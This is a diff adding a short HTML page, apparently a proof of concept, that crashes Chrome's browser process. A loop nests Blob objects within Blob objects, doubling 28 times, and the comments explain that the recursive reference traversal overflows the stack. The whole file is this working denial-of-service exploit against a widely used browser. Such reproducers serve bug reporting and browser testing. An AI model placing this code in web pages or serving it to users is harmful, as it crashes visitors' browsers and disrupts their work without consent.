@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<script>
+// Exponential blob reference graph — crashes Chrome's browser process
+// Each level doubles: blob_n = Blob([blob_{n-1}, blob_{n-1}])
+// At depth 28, the blob graph has 2^28 (268M) leaf references.
+// Blob construction triggers recursive reference counting/traversal
+// in the browser process, causing stack overflow.
+let b = new Blob(["A"]);
+for (let i = 0; i < 28; i++) b = new Blob([b, b]);
+</script>
